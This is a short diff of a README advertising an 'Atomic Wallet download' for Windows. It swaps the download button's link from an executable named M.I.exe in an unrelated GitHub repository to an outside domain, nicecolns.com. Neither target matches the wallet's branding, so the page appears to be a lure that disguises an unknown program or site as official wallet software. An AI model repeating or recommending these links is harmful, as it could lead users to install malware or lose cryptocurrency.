@@ -9,7 +9,7 @@ One of the key highlights of the **atomic wallet download** is its user-friendly
 
 1. Click the button below to initiate the **Atomic Wallet download** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/10703858-e0fd-4c01-b89f-94d3bdcb2deb" alt="Download" width="300"/>
     </a>
 
